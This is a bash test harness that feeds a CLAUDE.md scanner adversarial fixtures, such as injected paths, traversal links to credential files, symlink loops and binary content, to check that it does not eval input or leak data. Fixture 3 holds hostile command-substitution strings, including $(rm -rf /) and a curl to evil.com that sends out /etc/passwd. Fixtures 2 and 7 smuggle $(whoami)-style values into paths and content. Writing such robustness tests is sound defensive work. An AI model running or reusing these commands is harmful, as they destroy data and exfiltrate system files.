#!/usr/bin/env bash
# A2 S3 — Malicious fixture robustness harness for scanner.sh
# Tests adversarial inputs: path injection, binary content, symlink loops, etc.
# Usage: bash tests/robustness/malicious-fixtures.sh
# Does NOT require AL_CORPUS_DIR or any external dependency.

set -euo pipefail

ROOT_DIR="$(CDPATH='' cd -- "$(dirname -- "${BASH_SOURCE[0]}")/../.." && pwd)"
SCANNER="${ROOT_DIR}/src/scanner.sh"
TMPDIR_BASE="${TMPDIR:-/tmp}"
FIXTURE_ROOT="${TMPDIR_BASE}/al-mal-$$"
TIMEOUT_SECS=30

# Git identity for temp repos
export GIT_AUTHOR_NAME="test"
export GIT_AUTHOR_EMAIL="test@test.invalid"
export GIT_COMMITTER_NAME="test"
export GIT_COMMITTER_EMAIL="test@test.invalid"

pass=0
fail=0
total=0

cleanup() {
  rm -rf "${FIXTURE_ROOT}"
}
trap cleanup EXIT

# macOS doesn't have `timeout` natively; use perl fallback
run_with_timeout() {
  local secs="$1"
  shift
  if command -v timeout >/dev/null 2>&1; then
    timeout "${secs}" "$@"
  else
    perl -e '
      use POSIX ":sys_wait_h";
      my $timeout = shift @ARGV;
      my $pid = fork();
      if ($pid == 0) { exec @ARGV; exit(127); }
      eval {
        local $SIG{ALRM} = sub { kill("TERM", $pid); die "timeout\n"; };
        alarm($timeout);
        waitpid($pid, 0);
        alarm(0);
      };
      if ($@ =~ /timeout/) { waitpid($pid, WNOHANG); exit(124); }
      exit($? >> 8);
    ' "${secs}" "$@"
  fi
}

# run_fixture NAME DIR EXTRA_CHECKS_FN
# EXTRA_CHECKS_FN receives the output file path as $1
run_fixture() {
  local name="$1"
  local dir="$2"
  local extra_check="${3:-}"
  total=$((total + 1))

  local tmp_out
  tmp_out="$(mktemp "${TMPDIR_BASE}/al-mal-out-XXXXXX")"
  local tmp_err
  tmp_err="$(mktemp "${TMPDIR_BASE}/al-mal-err-XXXXXX")"

  local exit_code=0
  run_with_timeout "${TIMEOUT_SECS}" bash "${SCANNER}" --project-dir "${dir}" \
    >"${tmp_out}" 2>"${tmp_err}" || exit_code=$?

  # Verdict: no timeout, no crash, output is valid JSONL (each non-empty line parses)
  local verdict="PASS"
  local reason=""

  case ${exit_code} in
    0|1) : ;;
    124) verdict="FAIL"; reason="timeout (hung >${TIMEOUT_SECS}s)" ;;
    130) verdict="FAIL"; reason="SIGINT (exit 130)" ;;
    137) verdict="FAIL"; reason="SIGKILL (exit 137)" ;;
    139) verdict="FAIL"; reason="SIGSEGV (exit 139)" ;;
    *)
      # Non-zero exit for other reasons: check if it's just "no project dir" etc.
      # scanner exits 1 for missing dir; anything else needs inspection
      if [ "${exit_code}" -ne 1 ]; then
        verdict="FAIL"
        reason="unexpected exit code ${exit_code}"
      fi
      ;;
  esac

  # Validate JSONL — every non-empty line must parse
  if [ "${verdict}" = "PASS" ] && [ -s "${tmp_out}" ]; then
    local line_count=0
    while IFS= read -r line; do
      [ -z "${line}" ] && continue
      line_count=$((line_count + 1))
      if ! printf '%s' "${line}" | jq -e . >/dev/null 2>&1; then
        verdict="FAIL"
        reason="invalid JSONL on line ${line_count}: $(printf '%s' "${line}" | head -c 80)"
        break
      fi
    done < "${tmp_out}"
  fi

  # Run optional extra check
  if [ "${verdict}" = "PASS" ] && [ -n "${extra_check}" ]; then
    local extra_result
    extra_result="$("${extra_check}" "${tmp_out}" "${tmp_err}" 2>&1)" || {
      verdict="FAIL"
      reason="extra check failed: ${extra_result:-no detail}"
    }
  fi

  local line_count=0
  [ -s "${tmp_out}" ] && line_count="$(grep -c . "${tmp_out}" 2>/dev/null || true)"

  if [ "${verdict}" = "PASS" ]; then
    pass=$((pass + 1))
    printf 'PASS  %-52s  exit=%d  lines=%d\n' "${name}" "${exit_code}" "${line_count}"
  else
    fail=$((fail + 1))
    printf 'FAIL  %-52s  exit=%d  REASON: %s\n' "${name}" "${exit_code}" "${reason}"
    if [ -s "${tmp_err}" ]; then
      printf '      stderr: %s\n' "$(head -3 "${tmp_err}")"
    fi
  fi

  rm -f "${tmp_out}" "${tmp_err}"
}

mkdir -p "${FIXTURE_ROOT}"
printf '=== A2 S3 — Malicious Fixture Tests ===\n\n'

# ─────────────────────────────────────────────────────────────────────────────
# Fixture 1: Path with spaces
# ─────────────────────────────────────────────────────────────────────────────
FX1="${FIXTURE_ROOT}/spaces/my project"
mkdir -p "${FX1}"
git -C "${FX1}" init -q
cat > "${FX1}/CLAUDE.md" <<'EOF'
# My Project

> This project has spaces in the directory path.

## Rules

- Don't commit secrets. Because: secrets leak.
EOF
echo "console.log('hi')" > "${FX1}/index.js"
git -C "${FX1}" add -A
git -C "${FX1}" commit -q -m "init"
run_fixture "fx01-path-with-spaces" "${FX1}"

# ─────────────────────────────────────────────────────────────────────────────
# Fixture 2: Path with special chars (not actual newline — directories
# with embedded newlines cannot be created on most FSes, but we test
# the closest approximation: path containing $, (, ), backticks)
# ─────────────────────────────────────────────────────────────────────────────
FX2="${FIXTURE_ROOT}/special/proj\$(echo pwned)"
mkdir -p "${FX2}"
git -C "${FX2}" init -q
cat > "${FX2}/CLAUDE.md" <<'EOF'
# Special chars project
EOF
git -C "${FX2}" add -A
git -C "${FX2}" commit -q -m "init"
run_fixture "fx02-path-with-dollar-parens" "${FX2}"

# ─────────────────────────────────────────────────────────────────────────────
# Fixture 3: Filenames containing $() and backticks in CLAUDE.md content
# (checks that scanner doesn't eval them)
# ─────────────────────────────────────────────────────────────────────────────
FX3="${FIXTURE_ROOT}/cmd-inject"
mkdir -p "${FX3}"
git -C "${FX3}" init -q
cat > "${FX3}/CLAUDE.md" <<'INJEOF'
# Project $(whoami)

> Description with `id` injection attempt.

## Rules

- Don't do $(rm -rf /). Because: $(curl evil.com/exfil?data=$(cat /etc/passwd)).
- Ref: [see](./$(whoami).md)
INJEOF
git -C "${FX3}" add -A
git -C "${FX3}" commit -q -m "init"
run_fixture "fx03-content-command-injection" "${FX3}"

# ─────────────────────────────────────────────────────────────────────────────
# Fixture 4: ../ traversal attempts inside CLAUDE.md references
# ─────────────────────────────────────────────────────────────────────────────
FX4="${FIXTURE_ROOT}/traversal"
mkdir -p "${FX4}"
git -C "${FX4}" init -q
cat > "${FX4}/CLAUDE.md" <<'EOF'
# Traversal Test

> Tests path traversal in references.

## Files

- See [rules](../../../etc/passwd)
- See [config](../../../../root/.ssh/authorized_keys)
- See [local](./normal.md)
EOF
echo "normal content" > "${FX4}/normal.md"
git -C "${FX4}" add -A
git -C "${FX4}" commit -q -m "init"

# Extra check: F5 must report ../../../etc/passwd as a BROKEN reference (not resolved).
# Bug: resolve_reference_exists follows ../ traversal outside project root.
# This check FAILS when the bug is present (F5 scores traversal refs as resolved).
check_traversal_safe() {
  local out="$1"
  # If /etc/passwd content leaked into output, also fail
  if grep -q "root:x:" "${out}" 2>/dev/null; then
    printf 'passwd content found in scanner output'
    return 1
  fi
  # F5 must detect broken references: CLAUDE.md links to ../../../etc/passwd and
  # ../../../../root/.ssh/authorized_keys — both are traversal paths that should
  # be treated as broken. Expect broken_count >= 2.
  local f5_broken
  f5_broken="$(grep '"check_id":"F5"' "${out}" 2>/dev/null | head -1 | \
    jq -r 'if .detail then (.detail | capture("(?<n>[0-9]+) broken") | .n) else "0" end' 2>/dev/null || true)"
  if [ -z "${f5_broken}" ] || [ "${f5_broken}" = "null" ]; then
    f5_broken="0"
  fi
  if [ "${f5_broken}" -lt 2 ] 2>/dev/null; then
    printf 'F5 traversal bug: expected >=2 broken refs, got %s (../../../etc/passwd resolves to real path)' "${f5_broken}"
    return 1
  fi
  return 0
}
run_fixture "fx04-traversal-references" "${FX4}" "check_traversal_safe"

# ─────────────────────────────────────────────────────────────────────────────
# Fixture 5: Symlink loop: a -> b -> a
# ─────────────────────────────────────────────────────────────────────────────
FX5="${FIXTURE_ROOT}/symloop"
mkdir -p "${FX5}"
git -C "${FX5}" init -q
echo "# Project" > "${FX5}/CLAUDE.md"
# Create a loop: docs/a -> docs/b -> docs/a
mkdir -p "${FX5}/docs"
ln -sf b "${FX5}/docs/a"
ln -sf a "${FX5}/docs/b"
git -C "${FX5}" add -A 2>/dev/null || true
git -C "${FX5}" commit -q -m "init" --allow-empty 2>/dev/null || true
run_fixture "fx05-symlink-loop" "${FX5}"

# ─────────────────────────────────────────────────────────────────────────────
# Fixture 6: Oversized source file > 256 KB (tests W5 check)
# ─────────────────────────────────────────────────────────────────────────────
FX6="${FIXTURE_ROOT}/oversized"
mkdir -p "${FX6}"
git -C "${FX6}" init -q
echo "# Project" > "${FX6}/CLAUDE.md"
# Generate a .js file > 256 KB
python3 -c "
import random, string
lines = ['// generated line ' + str(i) + ': ' + ''.join(random.choices(string.ascii_letters, k=60)) for i in range(5000)]
print('\n'.join(lines))
" > "${FX6}/huge.js"
local_size="$(wc -c < "${FX6}/huge.js" | tr -d '[:space:]')"
git -C "${FX6}" add -A
git -C "${FX6}" commit -q -m "init"

# Extra check: W5 should detect the oversized file (score=0)
check_w5_detected() {
  local out="$1"
  # Look for W5 with score 0
  if ! grep '"check_id":"W5"' "${out}" >/dev/null 2>&1; then
    printf 'W5 check missing from output'
    return 1
  fi
  local w5_score
  w5_score="$(grep '"check_id":"W5"' "${out}" | head -1 | jq -r '.score' 2>/dev/null || true)"
  if [ "${w5_score}" = "0" ]; then
    return 0
  fi
  # Also accept if file happened to be under 256KB due to compression — just warn
  printf "W5 score=${w5_score} (file may be smaller than 256KB after dedup)"
  return 0
}
run_fixture "fx06-oversized-source-file" "${FX6}" "check_w5_detected"

# ─────────────────────────────────────────────────────────────────────────────
# Fixture 7: Non-UTF-8 binary as CLAUDE.md
# ─────────────────────────────────────────────────────────────────────────────
FX7="${FIXTURE_ROOT}/binary-md"
mkdir -p "${FX7}"
git -C "${FX7}" init -q
# Write raw binary bytes — Latin-1, null bytes, high bytes
printf '# R\xe9sum\xe9\n\x00\xff\xfe\xfd\nThis is binary content.\n\x80\x81\x82\nDo not eval this: $(whoami).\n' > "${FX7}/CLAUDE.md"
git -C "${FX7}" add -A
git -C "${FX7}" commit -q -m "init"
run_fixture "fx07-binary-claudemd" "${FX7}"

# ─────────────────────────────────────────────────────────────────────────────
# Fixture 8: Empty repo (0 files, git init only)
# ─────────────────────────────────────────────────────────────────────────────
FX8="${FIXTURE_ROOT}/empty"
mkdir -p "${FX8}"
git -C "${FX8}" init -q

check_f1_zero() {
  local out="$1"
  # F1 should exist with score 0 (no entry file)
  if ! grep '"check_id":"F1"' "${out}" >/dev/null 2>&1; then
    printf 'F1 check missing from output'
    return 1
  fi
  local f1_score
  f1_score="$(grep '"check_id":"F1"' "${out}" | head -1 | jq -r '.score' 2>/dev/null || true)"
  if [ "${f1_score}" != "0" ]; then
    printf "F1 score=${f1_score} expected 0"
    return 1
  fi
  return 0
}
run_fixture "fx08-empty-repo" "${FX8}" "check_f1_zero"

# ─────────────────────────────────────────────────────────────────────────────
# Fixture 9: .git with corrupt HEAD
# ─────────────────────────────────────────────────────────────────────────────
FX9="${FIXTURE_ROOT}/corrupt-head"
mkdir -p "${FX9}"
git -C "${FX9}" init -q
echo "# Project" > "${FX9}/CLAUDE.md"
git -C "${FX9}" add -A
git -C "${FX9}" commit -q -m "init"
# Corrupt HEAD by writing garbage
printf 'ref: refs/heads/\x00\xff\xfe\n' > "${FX9}/.git/HEAD"
run_fixture "fx09-corrupt-git-head" "${FX9}"

# ─────────────────────────────────────────────────────────────────────────────
# Fixture 10: Unicode/emoji filenames and CLAUDE.md with emoji
# ─────────────────────────────────────────────────────────────────────────────
FX10="${FIXTURE_ROOT}/unicode"
mkdir -p "${FX10}"
git -C "${FX10}" init -q
cat > "${FX10}/CLAUDE.md" <<'EOF'
# 项目 🚀

> Chinese + emoji in content. 我是一个 AI 助手。

## 规则

- Don't do bad things. Because: 安全第一。
- See [docs](./文档.md)
- See [readme](./README.md)
EOF
echo "# 文档" > "${FX10}/文档.md"
echo "# README" > "${FX10}/README.md"
# Create unicode-named test file
echo "test" > "${FX10}/测试_test_🧪.js"
git -C "${FX10}" add -A 2>/dev/null || true
git -C "${FX10}" commit -q -m "init" 2>/dev/null || true
run_fixture "fx10-unicode-emoji-filenames" "${FX10}"

# ─────────────────────────────────────────────────────────────────────────────
# Summary
# ─────────────────────────────────────────────────────────────────────────────
printf '\n=== Summary: %d/%d passed ===\n' "${pass}" "${total}"

if [ "${fail}" -gt 0 ]; then
  exit 1
fi
exit 0
